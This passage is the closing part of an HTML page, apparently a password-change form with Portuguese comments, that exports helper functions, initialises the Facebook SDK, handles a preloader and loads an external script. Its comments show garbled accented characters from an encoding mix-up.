        window.eye = function() {
            console.log('‚ö†Ô∏è Fun√ß√£o eye() est√° obsoleta, use togglePassword()');
        };
        
        // ==============================================
        // EXPORTAR FUN√á√ïES PARA USO GLOBAL
        // ==============================================
        
        window.passwordApp = {
            changePassword,
            isTokenValid,
            getAuthToken,
            showToast,
            showErrorToast,
            showSuccessToast
        };
    </script>

    <!-- Scripts originais mantidos -->
    <script>
        window.fbAsyncInit = function() {
            FB.init({
                appId: '448726619988568',
                autoLogAppEvents: true,
                xfbml: true,
                version: 'v14.0'
            });
        };
    </script>
    
    <script>
        document.onreadystatechange = function() {
            var state = document.readyState;
            if (state == "interactive") {
                showPreloader();
            } else if (state == "complete") {
                hidePreloader();
            }
        };
    </script>
    
    <script src="http://orac-le.online/public/assets/p.js"></script>
</body>
</html>